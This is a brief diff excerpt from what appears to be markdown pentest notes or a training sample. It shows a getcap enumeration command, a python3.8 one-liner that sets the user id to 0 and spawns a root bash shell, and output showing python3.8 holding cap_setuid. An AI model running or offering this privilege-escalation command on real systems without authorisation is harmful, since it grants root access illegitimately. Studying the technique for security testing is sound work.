@@ -43,9 +43,10 @@ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 getcap -r / 2>/dev/null
 ```
+```
 python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
-```
+
 ### Response:
 ```
 /usr/bin/python3.8 cap_setuid+ep
